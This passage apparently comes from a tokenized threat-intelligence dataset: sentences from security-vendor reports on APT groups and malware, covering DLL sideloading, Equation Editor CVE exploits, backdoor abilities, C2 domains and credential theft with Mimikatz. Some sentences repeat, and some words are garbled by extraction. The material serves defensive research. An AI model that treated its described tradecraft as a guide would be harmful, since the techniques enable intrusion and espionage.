revised
on
December
20
,
2018
.
 
The
configuration
file
then
loads
the
Trochilus
payload
into
memory
by
injecting
it
into
a
valid
system
process
.
 
Additionally
,
the
same
DLL
sideloading
technique
observed
in
the
Visma
attack
was
used
,
and
many
of
the
tools
deployed
by
the
APT10
shared
naming
similarities
as
well
1.bat
,
cu.exe
,
ss.rar
,
r.exe
,
pd.exe
.
 
Most
interestingly
,
Rapid7
observed
the
use
of
the
Notepad++
updater
gup.exe
as
a
legitimate
executable
to
sideload
a
malicious
DLL
(libcurl.dll)
in
order
to
deploy
a
variant
of
the
UPPERCUT
backdoor
also
known
as
ANEL
.
 
Insikt
Group
analysis
of
network
metadata
to
and
from
the
VPN
endpoint
IPs
revealed
consistent
connectivity
to
Citrix-hosted
infrastructure
from
all
eight
VPN
endpoint
IPs
starting
on
August
17
,
2018
the
same
date
the
first
authenticated
login
to
Vismas
network
was
made
using
stolen
credentials
.
 
KHRAT
is
a
backdoor
trojan
purported
to
be
used
with
the
China-linked
cyberespionage
group
DragonOK
.
 
Rapid7
reviewed
malware
discovered
in
the
victims
environment
and
found
implants
that
used
Dropbox
as
the
C2
.
 
The
analyzed
RTF
files
share
the
same
object
dimension
(objw2180\objh300)
used
to
track
the
RTF
weaponizer
in
our
previous
report
,
however
,
the
sample
was
not
exploiting
CVE-2017-11882
or
CVE-2018-0802
.
 
After
further
analysis
,
it
was
discovered
that
the
RTF
files
were
exploiting
the
CVE-2018-0798
vulnerability
in
Microsoft
s
Equation
Editor
(
EQNEDT32
)
.
 
Anomali
Researchers
were
able
to
identify
multiple
samples
of
malicious
RTF
documents
ITW
using
the
same
exploit
for
CVE-2018-0798
.
 
The
earliest
use
of
the
exploit
ITW
we
were
able
to
identify
and
confirm
is
a
sample
(e228045ef57fb8cc1226b62ada7eee9b)
dating
back
to
October
2018
(VirusTotal
submission
of
2018-10-29)
with
the
RTF
creation
time
2018-10-23
.
 
Upon
decrypting
and
executing
,
it
drops
two
additional
files
wsc_proxy.exe
(legitimate
Avast
executable)
and
a
malicious
DLL
wsc.dll
in
the
%TEMP%
folder
.
 
However
,
Beginning
on
25
June
2019
,
we
started
observing
multiple
commodity
campaigns
Mostly
dropping
AsyncRAT
using
the
updated
RTF
weaponizer
with
the
same
exploit
(
CVE-2018-0798
)
.
 
In
addition
,
a
current
ANY.RUN
playback
of
our
observed
Elise
infection
is
also
available
.
 
Upon
opening
of
the
MS
Word
document
,
our
embedded
file
exploits
CVE-2017-11882
to
drop
a
malicious
fake
Norton
Security
Shell
Extension
module
,
'NavShExt.dll'
,
which
is
then
injected
into
iexplore.exe
to
install
the
backdoor
,
begin
collection
,
and
activate
command
and
control
.
 
Moving
through
the
infection
process
,
NetWitness
Endpoint
detects
the
initial
exploit
CVE-2017-1182
in
action
as
the
Microsoft
Equation
Editor
,
'EQNEDT32.exe'
,
scores
high
for
potentially
malicious
activity
.
 
The
well-crafted
and
socially
engineered
malicious
documents
then
become
the
rst
stage
of
a
long
and
mainly
leless
infection
chain
that
eventually
delivers
POWERSTATS
,
a
signature
PowerShell
backdoor
of
this
threat
group
.
 
This
powerful
backdoor
can
receive
commands
from
the
attackers
,
enabling
it
to
exltrate
les
from
the
system
it
is
running
on
,
execute
additional
scripts
,
delete
les
,
and
more
.
 
If
the
macros
in
SPK
KANUN
DEKL
GB
GR.doc
are
enabled
,
an
embedded
payload
is
decoded
and
saved
in
the
%APPDATA%
directory
with
the
name
CiscoAny.exe
.
 
INF
les
have
been
used
in
the
past
by
MuddyWater
,
although
they
were
launched
using
Advpack.dll
and
not
IEAdvpack.dll
.
 
In
addition
,
by
using
VBA2Graph
,
we
were
able
to
visualize
the
VBA
call
graph
in
the
macros
of
each
document
.
 
We
assume
that
RunPow
stands
for
run
PowerShell
,
and
triggers
the
PowerShell
code
embedded
inside
the
.dll
file
.
 
The
main
delivery
method
of
this
type
of
backdoor
is
spear
phishing
emails
or
spam
that
uses
social
engineering
to
manipulate
targets
into
enabling
malicious
documents
.
 
This
includes
Python
scripts
.
 
Usually
,
the
Stageless
Meterpreter
has
the
Ext_server_stdapi.x64.dll
,
Ext_server_extapi.x64.dll
,
and
Ext_server_espia.x64.dll
extensions
.
 
However
,
Kaspersky
Security
Network
(KSN)
records
also
contain
links
that
victims
clicked
from
the
Outlook
web
client
outlook.live.com
as
well
as
attachments
arriving
through
the
Outlook
desktop
application
.
 
The
JavaScript
forces
visiting
web
browsers
to
collect
and
send
(via
a
POST
request)
web
browser
,
browser
version
,
country
of
origin
,
and
IP
address
data
to
the
attacker
controlled
server
jquerycodedownload.live/check.aspx
.
 
we
identified
two
methods
to
deliver
the
KerrDown
downloader
to
targets
.
 
The
link
to
the
final
payload
of
KerrDown
was
still
active
during
the
time
of
analysis
and
hence
we
were
able
to
download
a
copy
which
turned
out
to
be
a
variant
of
Cobalt
Strike
Beacon
.
 
While
investigating
KerrDown
we
found
multiple
RAR
files
containing
a
variant
of
the
malware
.
 
The
dropped
PE
file
has
the
distinctive
file
name
8.t
.
 
The
malware
was
first
seen
packed
with
VMProtect;
when
unpacked
the
sample
didnt
show
any
similarities
with
previously
known
malware
.
 
The
malware
starts
communicating
with
the
C&C
server
by
sending
basic
information
about
the
infected
machine
.
 
The
malware
basically
provides
a
remote
CMD/PowerShell
terminal
for
the
attackers
,
enabling
them
to
execute
scripts/commands
and
receive
the
results
via
HTTP
requests
.
 
This
time
the
document
purported
to
be
about
the
involvement
of
the
Emir
of
Qatar
in
funding
ISIS
,
which
was
seemingly
copied
from
a
website
critical
of
Qatar
.
 
The
SDK
,
named
SWAnalytics
is
integrated
into
seemingly
innocent
Android
applications
published
on
major
3rd
party
Chinese
app
stores
such
as
Tencent
MyApp
,
Wandoujia
,
Huawei
App
Store
,
and
Xiaomi
App
Store
.
 
After
app
installation
,
whenever
SWAnalytics
senses
victims
opening
up
infected
applications
or
rebooting
their
phones
,
it
silently
uploads
their
entire
contacts
list
to
Hangzhou
Shun
Wang
Technologies
controlled
servers
.
 
This
module
monitors
a
wide
range
of
device
activities
including
application
installation
/
remove
/
update
,
phone
restart
and
battery
charge
.
 
It
turns
out
that
contacts
data
isnt
the
only
unusual
data
SWAnalytics
is
interested
in
.
 
With
default
settings
,
SWAnalytics
will
scan
through
an
Android
devices
external
storage
,
looking
for
directory
tencent/MobileQQ/WebViewCheck
.
 
From
our
first
malicious
sample
encounter
back
in
mid-September
until
now
,
we
have
observed
12
infected
applications
,
the
majority
of
which
are
in
the
system
utility
category
.
 
By
listing
sub-folders
,
SWAnalytics
is
able
to
infer
QQ
accounts
which
have
never
been
used
on
the
device
.
 
To
make
this
data
harvesting
operation
flexible
,
SWAnalytics
equips
the
ability
to
receive
and
process
configuration
files
from
a
remote
Command-and-Control
.
 
Whenever
users
reboot
their
device
or
open
up
Network
Speed
Master
,
SWAnalytics
will
fetch
the
latest
configuration
file
from
http[:]//mbl[.]shunwang[.]com/cfg/config[.]json
.
 
In
order
to
understand
SWAnalytics
impact
,
we
turned
to
public
download
volume
data
available
on
Chandashi
,
one
of
the
app
store
optimization
vendors
specialized
in
Chinese
mobile
application
markets
.
 
According
to
Cheetah
Mobiles
follow-up
investigation
,
fraudulent
behaviors
came
from
two
3rd
party
SDKs
Batmobi
,
Duapps
integrated
inside
Cheetah
SDK
.
 
It
is
likely
a
new
campaign
or
actor
started
using
Panda
Banker
since
in
addition
to
the
previously
unseen
Japanese
targeting
,
Arbor
has
not
seen
any
indicator
of
compromise
(IOC)
overlaps
with
previous
Panda
Banker
campaigns
.
 
Webinjects
targeting
Japan
,
a
country
we
havent
seen
targeted
by
Panda
Banker
before
.
 
Japan
is
no
stranger
to
banking
malware
.
 
Based
on
recent
reports
,
the
country
has
been
plagued
by
attacks
using
the
Ursnif
and
Urlzone
banking
malware
.
 
This
post
was
our
first
analysis
of
the
first
Panda
Banker
campaign
that
weve
seen
to
target
financial
institutions
in
Japan
.
 
we
believe
the
iOS
malware
gets
installed
on
already
compromised
systems
,
and
it
is
very
similar
to
next
stage
SEDNIT
malware
we
have
found
for
Microsoft
Windows
systems
.
 
One
is
called
XAgent
detected
as
IOS_XAGENT.A
and
the
other
one
uses
the
name
of
a
legitimate
iOS
game
,
MadCap
detected
as
IOS_
XAGENT.B
.
 
Madcap
is
similar
to
the
XAgent
malware
,
but
the
former
is
focused
on
recording
audio
.
 
This
full-blown
spying
framework
consists
of
two
packages
named
Tokyo
and
Yokohama
.
 
Just
to
highlight
its
capabilities
,
TajMahal
is
able
to
steal
data
from
a
CD
burnt
by
a
victim
as
well
as
from
the
printer
queue
.
 
The
first
confirmed
date
when
TajMahal
samples
were
seen
on
a
victims
machine
is
August
2014
.
 
More
details
about
TajMahal
are
available
to
customers
of
the
Kaspersky
Intelligence
Reporting
service
.
 
The
delivery
of
KopiLuwak
in
this
instance
is
currently
unknown
as
the
MSIL
dropper
has
only
been
observed
by
Proofpoint
researchers
on
a
public
malware
repository
.
 
The
earliest
step
in
any
possible
attack(s)
involving
this
variant
of
KopiLuwak
of
which
Proofpoint
researchers
are
currently
aware
begin
with
the
MSIL
dropper
.
 
The
basic
chain
of
events
upon
execution
of
the
MSIL
dropper
include
dropping
and
executing
both
a
PDF
decoy
and
a
Javascript
(JS)
dropper
.
 
As
explained
in
further
detail
below
,
the
JS
dropper
ultimately
installs
a
JS
decryptor
onto
an
infected
machine
that
will
then
finally
decrypt
and
execute
the
actual
KopiLuwak
backdoor
in
memory
only
.
 
As
Proofpoint
has
not
yet
observed
this
attack
in
the
wild
it
is
likely
that
there
is
an
additional
component
that
leads
to
the
execution
of
the
MSIL
payload
.
 
The
newer
variant
of
KopiLuwak
is
now
capable
of
exfiltrating
files
to
the
C&C
as
well
as
downloading
files
and
saving
them
to
the
infected
machine
.
 
We
didnt
choose
to
name
it
after
a
vegetable;
the
.NET
malware
developers
named
it
Topinambour
themselves
.
 
The
role
of
the
.NET
module
is
to
deliver
the
known
KopiLuwak
JavaScript
Trojan
.
 
RocketMan!
(probably
a
reference
to
Donald
Trumps
nickname
for
Kim
Jong
Un)
and
MiamiBeach
serve
as
the
first
beacon
messages
from
the
victim
to
the
control
server
.
 
These
could
be
tools
to
circumvent
internet
censorship
,
such
as
Softether
VPN
4.12
and
psiphon3
,
or
Microsoft
Office
activators
.
 
These
campaign-related
VPSs
are
located
in
South
Africa
.
 
The
tool
does
all
that
a
typical
Trojan
needs
to
accomplish:
upload
,
download
and
execute
files
,
fingerprint
target
systems
.
 
The
PowerShell
version
of
the
Trojan
also
has
the
ability
to
get
screenshots
.
 
The
Trojan
is
quite
similar
to
the
.NET
RocketMan
Trojan
and
can
handle
the
same
commands;
additionally
,
it
includes
the
#screen
command
to
take
a
screenshot
.
 
Initial
reports
about
HIGHNOON
and
its
variants
reported
publicly
as
Winnti
dating
back
to
at
least
2013
indicated
the
tool
was
exclusive
to
a
single
group
,
contributing
to
significant
conflation
across
multiple
distinct
espionage
operations
.
 
BalkanRAT
enables
the
attacker
to
remotely
control
the
compromised
computer
via
a
graphical
interface
,
i.e.
,
manually;
BalkanDoor
enables
them
to
remotely
control
the
compromised
computer
via
a
command
line
,
i.e.
,
possibly
en
masse
.
 
Both
BalkanRAT
and
BalkanDoor
spread
in
Croatia
,
Serbia
,
Montenegro
,
and
Bosnia
and
Herzegovina
.
 
In
some
of
the
latest
samples
of
BalkanDoor
detected
in
2019
,
the
malware
is
distributed
as
an
ACE
archive
,
disguised
as
a
RAR
archive
(i.e.
,
not
an
executable
file)
,
specially
crafted
to
exploit
the
WinRAR
ACE
vulnerability
CVE-2018-20250
.
 
The
backdoor
can
connect
to
any
of
the
C&Cs
from
a
hardcoded
list
a
measure
to
increase
resilience
.
 
The
main
part
of
the
BalkanRAT
malware
is
a
copy
of
the
Remote
Utilities
software
for
remote
access
.
 
China
Chopper
is
a
tool
that
allows
attackers
to
remotely
control
the
target
system
that
needs
to
be
running
a
web
server
application
before
it
can
be
targeted
by
the
tool
.
 
China
Chopper
contains
a
remote
shell
(
Virtual
Terminal
)
function
that
has
a
first
suggested
command
of
netstat
an|find
ESTABLISHED
.
 
They
download
and
install
an
archive
containing
executables
and
trivially
modified
source
code
of
the
password-stealing
tool
Mimikatz
Lite
as
GetPassword.exe
.
 
The
tool
investigates
the
Local
Security
Authority
Subsystem
memory
space
in
order
to
find
,
decrypt
and
display
retrieved
passwords
.
 
The
China
Chopper
actor
activity
starts
with
the
download
and
execution
of
two
exploit
files
which
attempt
to
exploit
the
Windows
vulnerabilities
CVE-2015-0062
,
CVE-2015-1701
and
CVE-2016-0099
to
allow
the
attacker
to
modify
other
objects
on
the
server
.
 
The
following
archive
caught
our
attention
for
exploiting
a
WinRAR
unacev2
module
vulnerability
and
for
having
interesting
content
.
 
Lets
take
a
closer
look
at
ITG08s
TTPs
that
are
relevant
to
the
campaign
we
investigated
,
starting
with
its
spear
phishing
and
intrusion
tactics
and
covering
information
on
its
use
of
the
More_eggs
backdoor
.
 
Additional
capabilities
of
the
More_eggs
malware
include
the
download
and
execution
of
files
and
scripts
and
running
commands
using
cmd.exe
.
 
Based
on
this
,
we
believe
the
Rancor
attackers
were
targeting
political
entities
.
 
Other
groups
,
such
as
Buhtrap
,
Corkow
and
Carbanak
,
were
already
known
to
target
and
successfully
steal
money
from
financial
institutions
and
their
customers
in
Russia
.
 
Since
last
week
,
iSIGHT
Partners
has
worked
to
provide
details
on
the
power
outage
in
Ukraine
to
our
global
customers
.
 
The
attacks
we
attribute
to
Scarlet
Mimic
have
primarily
targeted
Uyghur
and
Tibetan
activists
as
well
as
those
who
are
interested
in
their
causes
.
 
The
most
recent
Scarlet
Mimic
attacks
we
have
identified
were
conducted
in
2015
and
suggest
the
group
has
a
significant
interest
in
both
Muslim
activists
and
those
interested
in
critiques
of
the
Russian
government
and
Russian
President
Vladimir
Putin
.
 
Based
on
analysis
of
the
data
and
malware
samples
we
have
collected
,
Unit
42
believes
the
attacks
described
herein
are
the
work
of
a
group
or
set
of
cooperating
groups
who
have
a
single
mission
,
collecting
information
on
minority
groups
who
reside
in
and
around
northwestern
China
.
 
In
the
past
,
Scarlet
Mimic
has
primarily
targeted
individuals
who
belong
to
these
minority
groups
as
well
as
their
supporters
,
but
we've
recently
found
evidence
to
indicate
the
group
also
targets
individuals
working
inside
government
anti-terrorist
organizations
.
 
Our
investigation
showed
that
these
attacks
were
targeted
,
and
that
the
threat
actor
sought
to
steal
communications
data
of
specific
individuals
in
various
countries
.
 
CapabilitiesFormBook
is
a
data
stealer
,
but
not
a
full-fledged
banker
.
 
While
discussions
of
threats
in
this
region
often
focus
on
"
North
America
"
generally
or
just
the
United
States
,
nearly
100
campaigns
during
this
period
were
either
specifically
targeted
at
Canadian
organizations
or
were
customized
for
Canadian
audiences
.
 
In
all
emails
sent
to
these
government
officials
,
the
actor
used
the
same
attachment
:
a
malicious
Microsoft
Word
document
that
exploited
the
CVE-2012-0158
vulnerability
to
drop
a
malicious
payload
.
 
In
this
latest
incident
,
the
group
registered
a
fake
news
domain
,
timesofindiaa.in
,
on
May
18
,
2016
,
and
then
used
it
to
send
spear
phishing
emails
to
Indian
government
officials
on
the
same
day
.
 
The
first
time
this
happened
was
at
the
beginning
of
the
month
,
when
Proofpoint
researchers
blew
the
lid
off
a
cyber-espionage
campaign
named
Operation
Transparent
Tribe
,
which
targeted
the
Indian
embassies
in
Saudi
Arabia
and
Kazakhstan
.
 
Back
in
February
2016
,
Indian
army
officials
issued
a
warning
against
the
usage
of
three
apps
,
WeChat
,
SmeshApp
,
and
Line
,
fearing
that
these
apps
collected
too
much
information
if
installed
on
smartphones
used
by
Indian
army
personnel
.
 
According
to
the
security
firm
,
this
campaign
targeted
Indian
military
officials
via
spear-phishing
emails
,
distributing
spyware
to
its
victims
via
an
Adobe
Reader
vulnerability
.
 
In
addition
to
these
,
the
Animal
Farm
attackers
used
at
least
one
unknown
,
mysterious
malware
during
an
operation
targeting
computer
users
in
Burkina
Faso
.
 
PLATINUM
's
persistent
use
of
spear
phishing
tactics
(
phishing
attempts
aimed
at
specific
individuals
)
and
access
to
previously
undiscovered
zero-day
exploits
have
made
it
a
highly
resilient
threat
.
 
The
group
's
persistent
use
of
spear
phishing
tactics
(
phishing
attempts
aimed
at
specific
individuals
)
and
access
to
previously
undiscovered
zero-day
exploits
have
made
it
a
highly
resilient
threat
.
 
Researching
this
attack
and
the
malware
used
therein
led
Microsoft
to
discover
other
instances
of
PLATINUM
attacking
users
in
India
around
August
2015
.
 
The
Poseidon
Group
actively
targets
this
sort
of
corporate
environment
for
the
theft
of
intellectual
property
and
commercial
information
,
occasionally
focusing
on
personal
information
on
executives
.
 
The
previous
two
volumes
of
the
Microsoft
Security
Intelligence
Report
explored
the
activities
of
two
such
groups
,
code-named
STRONTIUM
and
PLATINUM
,
which
used
previously
unknown
vulnerabilities
and
aggressive
,
persistent
techniques
to
target
specific
individuals
and
institutions
often
including
military
installations
,
intelligence
agencies
,
and
other
government
bodies
.
 
Mark
Zuckerberg
,
Jack
Dorsey
,
Sundar
Pichai
,
and
Daniel
Ek
the
CEOs
of
Facebook
,
Twitter
,
Google
and
Spotify
,
respectively
have
also
fallen
victim
to
the
hackers
,
dispelling
the
notion
that
a
career
in
software
and
technology
exempts
one
from
being
compromised
.
 
The
group
is
well
known
:
They
hijacked
WikiLeaks'
DNS
last
month
shortly
after
they
took
over
HBO
's
Twitter
account
;
last
year
,
they
took
over
Mark
Zuckerberg
's
Twitter
and
Pinterest
accounts
;
and
they
hit
both
BuzzFeed
and
TechCrunch
not
long
after
that
.
 
OurMine
is
well
known
:
They
hijacked
WikiLeaks'
DNS
last
month
shortly
after
they
took
over
HBO
's
Twitter
account
;
last
year
,
they
took
over
Mark
Zuckerberg
's
Twitter
and
Pinterest
accounts
;
and
they
hit
both
BuzzFeed
and
TechCrunch
not
long
after
that
.
 
Probably
the
most
high-profile
attack
that
GandCrab
was
behind
is
a
series
of
infections
at
customers
of
remote
IT
support
firms
in
the
month
of
February
.
 
Further
tracking
of
the
Lazaruss
activities
has
enabled
Kaspersky
researchers
to
discover
a
new
operation
,
active
since
at
least
November
2018
,
which
utilizes
PowerShell
to
control
Windows
systems
and
Mac
OS
malware
to
target
Apple
customers
.
 
Users
who
failed
to
patch
their
systems
may
find
themselves
mining
cryptocurrency
for
threat
actors
.
 
Keeping
in
mind
the
sensitivity
of
passwords
,
GoCrack
includes
an
entitlement-based
system
that
prevents
users
from
accessing
task
data
unless
they
are
the
original
creator
or
they
grant
additional
users
to
the
task
.
 
The
threat
actors
emails
usually
contain
a
picture
or
a
link
without
a
malicious
payload
and
are
sent
out
to
a
huge
recipient
database
of
up
to
85
,
000
users
.
 
The
admin@338
previous
activities
against
financial
and
policy
organizations
have
largely
focused
on
spear
phishing
emails
written
in
English
,
destined
for
Western
audiences
.
 
This
week
the
experts
at
FireEye
discovered
that
a
group
of
Chinese-based
hackers
called
admin@338
had
sent
multiple
MH370-themed
spear
phishing
emails
,
the
attackers
targeted
government
officials
in
Asia-Pacific
,
it
is
likely
for
cyber
espionage
purpose
.
 
The
attackers
used
the
popular
Poison
Ivy
RAT
and
WinHTTPHelper
malware
to
compromise
the
computers
of
government
officials
.
 
The
admin@338
used
the
popular
Poison
Ivy
RAT
and
WinHTTPHelper
malware
to
compromise
the
computers
of
government
officials
.
 
The
group
previous
activities
against
financial
and
policy
organizations
have
largely
focused
on
spear
phishing
emails
written
in
English
,
destined
for
Western
audiences
.
 
The
targets
were
similar
to
a
2015
TG-4127
campaign
individuals
in
Russia
and
the
former
Soviet
states
,
current
and
former
military
and
government
personnel
in
the
U.S.
and
Europe
,
individuals
working
in
the
defense
and
government
supply
chain
,
and
authors
and
journalists
but
also
included
email
accounts
linked
to
the
November
2016
United
States
presidential
election
.
 
APT28
espionage
activity
has
primarily
targeted
entities
in
the
U.S.
,
Europe
,
and
the
countries
of
the
former
Soviet
Union
,
including
governments
,
militaries
,
defense
attaches
,
media
entities
,
and
dissidents
and
figures
opposed
to
the
current
Russian
government
.
 
APT28
espionage
activity
has
primarily
targeted
entities
in
the
U.S.
,
Europe
,
and
the
countries
of
the
former
Soviet
Union
,
including
governments
and
militaries
,
defense
attaches
,
media
entities
,
and
dissidents
and
figures
opposed
to
the
current
Russian
government
.
 
APT28
targets
Russian
rockers
and
dissidents
Pussy
Riot
via
spear-phishing
emails
.
 
We
have
reasons
to
believe
that
the
operators
of
the
APT28
network
are
either
Russian
citizens
or
citizens
of
a
neighboring
country
that
speak
Russian
.
 
Russian
citizensjournalists
,
software
developers
,
politicians
,
researchers
at
universities
,
and
artists
are
also
targeted
by
Pawn
Storm
.
 
In
addition
to
focused
targeting
of
the
private
sector
with
ties
to
Vietnam
,
APT32
has
also
targeted
foreign
governments
,
as
well
as
Vietnamese
dissidents
and
journalists
since
at
least
2013
.
 
In
2014
,
APT32
leveraged
a
spear-phishing
attachment
titled
"
Plans
to
crackdown
on
protesters
at
the
Embassy
of
Vietnam.exe
,
"
which
targeted
dissident
activity
among
the
Vietnamese
diaspora
in
Southeast
Asia
.
 
In
2017
,
social
engineering
content
in
lures
used
by
the
actor
provided
evidence
that
they
were
likely
used
to
target
members
of
the
Vietnam
diaspora
in
Australia
as
well
as
government
employees
in
the
Philippines
.
 
APT33
sent
spear
phishing
emails
to
employees
whose
jobs
related
to
the
aviation
industry
.
 
APT37
targeted
a
research
fellow
,
advisory
member
,
and
journalist
associated
with
different
North
Korean
human
rights
issues
and
strategic
organizations
.
 
The
majority
of
APT37
activity
continues
to
target
South
Korea
,
North
Korean
defectors
,
and
organizations
and
individuals
involved
in
Korean
Peninsula
reunification
efforts
.
 
In
May
2017
,
APT37
used
a
bank
liquidation
letter
as
a
spear
phishing
lure
against
a
board
member
of
a
Middle
Eastern
financial
company
.
 
Per
the
complaint
,
the
email
account
watsonhenny@gmail.com
was
used
to
send
LinkedIn
invitations
to
employees
of
a
bank
later
targeted
by
APT38
.
 
The
APT38
uses
DYEPACK
to
manipulate
the
SWIFT
transaction
records
and
hide
evidence
of
the
malicious
transactions
,
so
bank
personnel
are
none
the
wiser
when
they
review
recent
transactions
.
 
APT39
's
focus
on
the
telecommunications
and
travel
industries
suggests
intent
to
perform
monitoring
,
tracking
,
or
surveillance
operations
against
specific
individuals
,
collect
proprietary
or
customer
data
for
commercial
or
operational
purposes
that
serve
strategic
requirements
related
to
national
priorities
,
or
create
additional
accesses
and
vectors
to
facilitate
future
campaigns
.
 
Other
groups
attributed
to
Iranian
attackers
,
such
as
Rocket
Kitten
,
have
targeted
Iranian
individuals
in
the
past
,
including
anonymous
proxy
users
,
researchers
,
journalists
,
and
dissidents
.
 
We
believe
that
the
Carbanak
campaign
is
a
clear
indicator
of
a
new
era
in
cybercrime
in
which
criminals
use
APT
techniques
directly
against
the
financial
industry
instead
of
through
its
customers
.
 
Carbanak
has
its
origin
in
more
common
financial
fraud
including
theft
from
consumer
and
corporate
bank
accounts
in
Europe
and
Russia
,
using
standard
banking
malware
,
mainly
Carberp
.
 
The
group
has
its
origin
in
more
common
financial
fraud
including
theft
from
consumer
and
corporate
bank
accounts
in
Europe
and
Russia
,
using
standard
banking
malware
,
mainly
Carberp
.
 
Gallmaker
's
targets
are
embassies
of
an
Eastern
European
country
.
 
However
,
in
September
last
year
,
our
friends
at
CSIS
published
a
blog
detailing
a
new
Carbanak
variant
affecting
one
of
its
customers
.
 
360
and
Tuisec
already
identified
some
Gorgon
Group
members
.
 
Symantec
also
confirmed
seeing
the
Lazarus
wiper
tool
in
Poland
at
one
of
their
customers
.
 
This
new
campaign
,
dubbed
HaoBao
,
resumes
Lazarus
'
previous
phishing
emails
,
posed
as
employee
recruitment
,
but
now
targets
Bitcoin
users
and
global
financial
organizations
.
 
Beginning
in
2017
,
the
Lazarus
group
heavily
targeted
individuals
with
spear
phishing
emails
impersonating
job
recruiters
which
contained
malicious
documents
.
 
We
concluded
that
Lazarus
Group
was
responsible
for
WannaCry
,
a
destructive
attack
in
May
that
targeted
Microsoft
customers
.
 
The
targeting
of
this
individual
suggests
the
actors
are
interested
in
breaching
the
French
Ministry
of
Foreign
Affairs
itself
or
gaining
insights
into
relations
between
France
and
Taiwan
.
 
On
November
10
,
2015
,
threat
actors
sent
a
spear-phishing
email
to
an
individual
at
the
French
Ministry
of
Foreign
Affairs
.
 
On
November
10
,
2015
,
Lotus
Blossom
sent
a
spear-phishing
email
to
an
individual
at
the
French
Ministry
of
Foreign
Affairs
.
 
APT
threat
actors
,
most
likely
nation
state-sponsored
,
targeted
a
diplomat
in
the
French
Ministry
of
Foreign
Affairs
with
a
seemingly
legitimate
invitation
to
a
technology
conference
in
Taiwan
.
 
Additionally
,
the
targeting
of
a
French
diplomat
based
in
Taipei
,
Taiwan
aligns
with
previous
targeting
by
these
actors
,
as
does
the
separate
infrastructure
.
 
Since
at
least
2014
,
APT32
,
also
known
as
the
OceanLotus
Group
,
has
targeted
foreign
corporations
with
investments
in
Vietnam
,
foreign
governments
,
journalists
,
and
Vietnamese
dissidents
.
 
APT35
typically
targets
U.S.
and
the
Middle
Eastern
military
,
diplomatic
and
government
personnel
,
organizations
in
the
media
,
energy
and
defense
industrial
base
(
DIB
)
,
and
engineering
,
business
services
and
telecommunications
sectors
.
 
COBALT
GYPSY
has
used
spearphishing
to
target
telecommunications
,
government
,
defense
,
oil
,
and
financial
services
organizations
based
in
or
affiliated
with
the
MENA
region
,
identifying
individual
victims
through
social
media
sites
.
 
The
Magic
Hound
has
repeatedly
used
social
media
to
identify
and
interact
with
employees
at
targeted
organizations
and
then
used
weaponized
Excel
documents
.
 
The
May
2014
'
Operation
Saffron
Rose
'
publication
identifies
an
Iranian
hacking
group
formerly
named
'
Ajax
Security
'
(
code-named
'
Flying
Kitten
'
by
CrowdStrike
)
engaged
in
active
spear
phishing
attacks
on
Iranian
dissidents
(
those
attempting
to
circumvent
government
traffic
monitoring
)
.
 
An
Iranian
hacking
group
formerly
named
Ajax
Security
(
code-named
'
Flying
Kitten
'
by
CrowdStrike
)
engaged
in
active
spear
phishing
attacks
on
Iranian
dissidents
(
those
attempting
to
circumvent
government
traffic
monitoring
)
.
 
PIVY
also
played
a
key
role
in
the
2011
campaign
known
as
Nitro
that
targeted
chemical
makers
,
government
agencies
,
defense
contractors
,
and
human
rights
groups.10,11
Still
active
a
year
later
,
the
Nitro
attackers
used
a
zero-day
vulnerability
in
Java
to
deploy
PIVY
in
2012
.
 
APT10
is
known
to
have
exfiltrated
a
high
volume
of
data
from
multiple
victims
,
exploiting
compromised
MSP
networks
,
and
those
of
their
customers
,
to
stealthily
move
this
data
around
the
world
.
 
Targeted
sectors
of
Molerats
include
governmental
and
diplomatic
institutions
,
including
embassies
;
companies
from
the
aerospace
and
defence
Industries
;
financial
institutions
;
journalists
;
software
developers
.
 
It
was
during
operator
X
's
network
monitoring
that
the
attackers
placed
Naikon
proxies
within
the
countries
'
borders
,
to
cloak
and
support
real-time
outbound
connections
and
data
Exfiltration
from
high-profile
victim
organizations
.
 
In
early
May
2016
,
both
PROMETHIUM
and
NEODYMIUM
started
conducting
attack
campaigns
against
specific
individuals
in
Europe
.
 
Although
most
malware
today
either
seeks
monetary
gain
or
conducts
espionage
for
economic
advantage
,
both
of
these
activity
groups
appear
to
seek
information
about
specific
individuals
.
 
Attackers
using
several
locations
in
China
have
leveraged
C&C
servers
on
purchased
hosted
services
in
the
United
States
and
compromised
servers
in
the
Netherlands
to
wage
attacks
against
global
oil
,
gas
,
and
petrochemical
companies
,
as
well
as
individuals
and
executives
in
Kazakhstan
,
Taiwan
,
Greece
,
and
the
United
States
to
acquire
proprietary
and
highly
confidential
information
.
 
Attackers
using
several
locations
in
China
have
leveraged
C&C
servers
on
purchased
hosted
services
in
the
United
States
and
compromised
servers
in
the
Netherlands
to
wage
attacks
against
global
oil
,
gas
,
and
petrochemical
companies
,
as
well
as
individuals
and
executives
in
Kazakhstan
,
Taiwan
,
Greece
,
and
the
United
States
to
acquire
proprietary
and
highly
confidential
information
.
 
Additionally
,
HELIX
KITTEN
actors
have
shown
an
affinity
for
creating
thoroughly
researched
and
structured
spear-phishing
messages
relevant
to
the
interests
of
targeted
personnel
.
 
The
attackers
sent
multiple
emails
containing
macro-enabled
XLS
files
to
employees
working
in
the
banking
sector
in
the
Middle
East
.
 
In
late
2015
,
Symantec
identified
suspicious
activity
involving
a
hacking
tool
used
in
a
malicious
manner
against
one
of
our
customers
.
 
The
SWC
of
a
Uyghur
cultural
website
suggests
intent
to
target
the
Uyghur
ethnic
group
,
a
Muslim
minority
group
primarily
found
in
the
Xinjiang
region
of
China
.
 
It's
possible
TG-3390
used
a
waterhole
to
infect
data
center
employees
.
 
The
initial
attack
vector
used
in
the
attack
against
the
data
center
is
unclear
,
but
researchers
believe
LuckyMouse
possibly
had
conducted
watering
hole
or
phishing
attacks
to
compromise
accounts
belonging
to
employees
at
the
national
data
center
.
 
The
group
,
believed
to
be
based
in
China
,
has
also
targeted
defense
contractors
,
colleges
and
universities
,
law
firms
,
and
political
organizations
including
organizations
related
to
Chinese
minority
ethnic
groups
.
 
In
all
cases
,
based
on
the
nature
of
the
computers
infected
by
Thrip
,
it
appeared
that
the
telecoms
companies
themselves
and
not
their
customers
were
the
targets
of
these
attacks
.
 
Turla
is
a
notorious
group
that
has
been
targeting
government
officials
.
 
Turla
is
a
notorious
group
that
has
been
targeting
diplomats
.
 
The
attackers
behind
Epic
Turla
have
infected
several
hundred
computers
in
more
than
45
countries
,
including
embassies
.
 
From
February
to
September
2016
,
WhiteBear
activity
was
narrowly
focused
on
embassies
and
consular
operations
around
the
world
.
 
All
of
these
early
WhiteBear
targets
were
related
to
embassies
and
diplomatic/foreign
affair
organizations
.
 
Thus
,
Turla
operators
had
access
to
